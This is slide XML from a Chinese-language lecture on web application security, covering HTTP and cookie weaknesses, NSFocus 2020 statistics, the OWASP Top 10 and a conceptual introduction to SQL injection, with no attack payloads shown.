      <p:bldP spid="408614" grpId="0" animBg="1"/>
      <p:bldP spid="4086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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>应用体系结构潜在弱点</a:t>
            </a:r>
          </a:p>
        </p:txBody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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>客户端</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>：活动内容执行，客户端软件漏洞的利用，交互站点脚本的错误；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>传输</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>：偷听客户</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>服务器通信，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>SSL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>重定向；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>服务器</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>服务器软件漏洞；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>应用程序</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>：攻击</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>认证、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>授权、站点结构、输入验证，以及应用程序逻辑；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>数据库</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>：通过数据库查询运行优先权命令，查询操纵返回额外的数据集。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1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1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1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1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1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1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1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1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1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1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58813" y="1443326"/>
            <a:ext cx="7772400" cy="4694237"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>HTTP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>协议是一种简单的、无状态的应用层协议（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>RFC1945</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>RFC2616</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN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无状态使攻击变得容易</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>基于</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>ASCII</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>码，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>无</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>需弄清复杂的二进制编码机制，攻击者</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>就</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>可了解协议中</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>明文信息</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>互联网中存在</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>大量中间盒子，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>HTTP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>标准</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>(RFC 2616</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>和</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>RFC 7320)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>的理解如果不一致，就有可能导致一些新的攻击发生【Host-of-Troubles 多Host歧义攻击 HTTP实现导致的多重Host歧义https://woj.app/4055.html】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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>协议安全问题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72667" y="1457180"/>
            <a:ext cx="7772400" cy="4597255"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>为什么需要</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>？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解决无状态问题</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>保存客户服务器之间的一些状态信息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/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>是指网站为了辨别用户身份、进行会话跟踪而储存在用户本地终端上的一些数据（通常经过编码），最早由网景公司的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Lou </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>Montulli</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>在</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>1993</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>年</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>3</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>月发明的，后被采纳为</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>RFC</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>标准（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>RFC2109</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>RFC2965</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>）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Cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>的安全问题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6522" y="1429471"/>
            <a:ext cx="7772400" cy="4694237"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>的生成与维护</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>由服务器端生成，发送给客户端（一般是浏览器），浏览器会将</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>的值保存到某个目录下的文本文件内，下次请求同一网站时就发送该</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>给服务器（前提是浏览器设置为启用</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>）</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>服务器可以利用</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>存储信息并经常性地维护这些信息，从而判断在</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>HTTP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>传输中的状态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Cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>安全问题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61831" y="1429471"/>
            <a:ext cx="7772400" cy="4694237"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>的生成与维护</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>在生成时就会被指定一个</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Expire</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>值，这就是</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>的生存周期</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>。到期自动清除</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>如果一台计算机上安装了多个浏览器，每个浏览器都会在各自独立的空间存放</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Cookie</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>中的内容大多数经过了编码处理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Cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>安全问题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Cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>的一般格式如下：</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>NAME= VALUE; expires= DATE; path= PATH;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domain= DOMAIN_NAME; secure</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>示例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autolog</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> = bWlrzTpteXMxy3IzdA%3D%3D; expires=Sat, 01-Jan-2018 00:00:00 GMT; path=/; domain=victim.com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Cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>安全问题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Cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>中包含了一些敏感信息，如用户名、计算机名、使用的浏览器和曾经访问的网站等，攻击者可以利用它来进行窃密和欺骗攻击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Cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>安全问题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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>应用安全的严重性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567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6725" y="1457325"/>
            <a:ext cx="8435975" cy="1709738"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0" smtClean="0"/>
              <a:t>当前，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0" smtClean="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0" smtClean="0"/>
              <a:t>无处不在，应用广泛</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0" smtClean="0"/>
              <a:t>在</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>安全漏洞报告中，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>应用安全漏洞一直占据最</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0" smtClean="0"/>
              <a:t>前列</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>《绿盟科技</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>2020 网络安全观察</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>》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6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6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6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6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6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3565" y="1554163"/>
            <a:ext cx="6722895" cy="41148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smtClean="0"/>
              <a:t>NSFocus《2020</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="3600" dirty="0" smtClean="0"/>
              <a:t>网络安全观察报告</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3600" dirty="0" smtClean="0"/>
              <a:t>》</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN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smtClean="0"/>
              <a:t>NSFocus《2020</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="3600" dirty="0" smtClean="0"/>
              <a:t>网络安全观察报告</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3600" dirty="0" smtClean="0"/>
              <a:t>》</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="3600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196" y="1438275"/>
            <a:ext cx="3914683" cy="385921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228" y="1605476"/>
            <a:ext cx="4368521" cy="36920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smtClean="0"/>
              <a:t>NSFocus《2020</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="3600" dirty="0" smtClean="0"/>
              <a:t>网络安全观察报告</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3600" dirty="0" smtClean="0"/>
              <a:t>》</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="36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773" y="1304427"/>
            <a:ext cx="8636202" cy="41533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介绍</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>OWASP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1657350"/>
            <a:ext cx="8507413" cy="44100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OWASP: Open Web Application Security </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" smtClean="0">
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>Project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http</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>://www.owasp.org, http://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" smtClean="0">
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>www.owasp.org.cn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latin typeface="黑体" panose="02010609060101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>一个全志愿者组成的、非营利性机构；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="黑体" panose="02010609060101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>开发和出版免费专业开源的文档、工具和标准；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="黑体" panose="02010609060101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>致力于帮助组织机构理解和提高他们的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="黑体" panose="02010609060101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="黑体" panose="02010609060101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>安全。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2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2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2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2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2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2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2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2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2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2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介绍</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>OWASP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355724"/>
            <a:ext cx="8172450" cy="420029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369" y="1101725"/>
            <a:ext cx="4983162" cy="54616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/>
            </a:r>
            <a:br>
              <a:rPr lang="zh-CN" altLang="en-US" b="0" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>OWASP Top </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>10-2017</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="0" dirty="0"/>
              <a:t>	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44" y="1441450"/>
            <a:ext cx="8652698" cy="5181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/>
            </a:r>
            <a:br>
              <a:rPr lang="zh-CN" altLang="en-US" b="0" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>OWASP Top </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>10-2017</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="0" dirty="0"/>
              <a:t>	</a:t>
            </a:r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534" y="1230313"/>
            <a:ext cx="8948466" cy="53514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/>
            </a:r>
            <a:br>
              <a:rPr lang="zh-CN" altLang="en-US" b="0" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>OWASP Top </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>10-2021</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="0" dirty="0"/>
              <a:t>	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34770" y="1111885"/>
            <a:ext cx="6421120" cy="5746115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注入漏洞</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="3600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987" y="1209386"/>
            <a:ext cx="8912739" cy="46294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注入漏洞</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="36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563" y="1191821"/>
            <a:ext cx="8898788" cy="44374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注入漏洞</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="36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4937" y="1211132"/>
            <a:ext cx="8861835" cy="409429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13765" y="5862955"/>
            <a:ext cx="78447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https://cwe.mitre.org/data/definitions/89.html</a:t>
            </a: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3531870" y="4608195"/>
            <a:ext cx="1234440" cy="12642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注入漏洞</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3600" dirty="0" smtClean="0"/>
              <a:t>-SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="3600" dirty="0" smtClean="0"/>
              <a:t>注入</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="36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38" y="1290439"/>
            <a:ext cx="8907802" cy="18736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37" y="3271836"/>
            <a:ext cx="8559801" cy="4159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3536" y="3886200"/>
            <a:ext cx="557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 smtClean="0"/>
              <a:t>如果一个名称为</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1" smtClean="0"/>
              <a:t>wiley</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>的攻击者输入以下内容：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536" y="3868698"/>
            <a:ext cx="2159823" cy="38683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36" y="4960143"/>
            <a:ext cx="8555931" cy="37623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63536" y="4517231"/>
            <a:ext cx="2579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 smtClean="0"/>
              <a:t>构造出的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1" smtClean="0"/>
              <a:t>sql</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>语句如下：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63536" y="5671660"/>
            <a:ext cx="128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等效语句：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861" y="5702080"/>
            <a:ext cx="2557463" cy="3389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注入漏洞</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3600" dirty="0" smtClean="0"/>
              <a:t>-SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="3600" dirty="0" smtClean="0"/>
              <a:t>注入</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="3600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="文本框 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="-93664" y="2086859"/>
            <a:ext cx="557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 smtClean="0"/>
              <a:t>如果一个名称为</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1" smtClean="0"/>
              <a:t>wiley</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>的攻击者输入以下内容：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7311" y="3236345"/>
            <a:ext cx="2579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 smtClean="0"/>
              <a:t>构造出的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1" smtClean="0"/>
              <a:t>sql</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>语句如下：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11" y="1437004"/>
            <a:ext cx="8856664" cy="3389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0" y="2505435"/>
            <a:ext cx="4152283" cy="52339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35" y="3813190"/>
            <a:ext cx="7841475" cy="78125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63535" y="4881440"/>
            <a:ext cx="8151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许多数据库服务器（包括</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Microsoft</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>R</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>）</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>SQL Server 2000</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>）都允许同时执行多个以分号分隔的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
